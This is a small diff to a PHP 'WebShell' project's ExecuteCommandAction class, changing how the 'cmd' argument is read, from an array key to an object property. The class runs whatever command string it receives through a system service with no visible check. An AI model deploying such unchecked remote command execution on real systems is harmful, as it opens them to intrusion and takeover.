@@ -3,10 +3,10 @@ namespace WebShell;
 
 class ExecuteCommandAction implements Action
 {
-    public function run(array $args): string
+    public function run(object $args): string
     {
         // Extract the command from the arguments
-        $cmd = $args['cmd'];
+        $cmd = $args->cmd;
 
         // Run the command and add it to the command history
         $output = SystemService::getInstance()->execute($cmd);
